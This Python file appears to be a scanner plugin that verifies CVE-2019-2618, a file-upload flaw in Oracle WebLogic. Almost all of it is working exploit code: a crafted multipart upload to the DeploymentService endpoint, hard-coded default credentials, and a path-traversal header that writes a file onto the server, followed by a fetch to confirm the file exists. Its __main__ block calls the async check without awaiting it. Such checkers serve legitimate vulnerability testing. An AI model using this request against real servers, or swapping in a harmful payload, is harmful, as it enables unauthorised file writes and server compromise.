#!/usr/bin/env python3

from app.lib.common import get_useragent
from app.lib.request import request

class CVE_2019_2618_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'CVE-2019-2618',
            'description': 'Weblogic File Upload Vulnerability, 受影响版本: Weblogic 10.3.6.0.0, 12.1.3.0.0 and 12.2.1.3.0',
            'date': '2019-04-23',
            'exptype': 'check',
            'type': 'File Upload'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.osname = 'Unknown'
        self.headers = {
            'User-Agent': get_useragent(),
            'content-type': "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            'username': "weblogic",
            'password': "Oracle@123",
            'wl_request_type': "app_upload",
            'wl_upload_application_name': "../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war",
            'wl_upload_delta': "true",
            'archive': "true",
            'cache-control': "no-cache"
        }
    
    async def check(self):
        
        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """
        
        try:
            check_data = 'This is a Test'
            payload = "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"check.txt\"; filename=\"check.txt\"\r\nContent-Type: false\r\n\r\n %s \r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" % (check_data)
            payload_url = self.url + "/bea_wls_deployment_internal/DeploymentService"
            result = await request.post(payload_url, headers = self.headers, data = payload)
            check = await request.get(self.url +"/bea_wls_deployment_internal/check.txt")
            if check.status == 200 and 'This is a Test' in await check.text():
                return True
        except Exception as e:
            # print(e)
            pass

if  __name__ == "__main__":
    CVE_2019_2618 = CVE_2019_2618_BaseVerify('http://127.0.0.1:7001')
    print(CVE_2019_2618.check())


